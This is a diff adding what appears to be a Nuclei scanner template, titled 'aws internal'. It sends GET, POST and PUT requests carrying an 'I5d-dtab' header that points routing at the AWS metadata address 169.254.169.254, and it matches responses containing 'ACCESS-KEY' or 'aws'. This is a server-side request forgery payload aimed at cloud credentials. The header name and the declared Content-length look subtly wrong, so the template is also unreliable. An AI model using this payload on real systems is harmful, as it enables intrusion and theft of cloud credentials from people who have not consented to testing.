@@ -1,0 +1,40 @@
+id: aws
+
+info:
+  name: aws internal
+  author: MR.iambatman
+  severity: high
+  description: aws-find
+
+requests:
+
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+        I5d-dtab: /$/inet/169.254.169.254/80
+        Content-length: 100
+
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+        I5d-dtab: /$/inet/169.254.169.254/80
+        Content-length: 100
+   
+      - |
+        PUT / HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+        I5d-dtab: /$/inet/169.254.169.254/80
+        Content-length: 100
+    
+    redirects: true
+    matchers:
+      - type: word
+        words:
+          - "latest"
+          - "ACCESS-KEY"
+          - "aws"
+
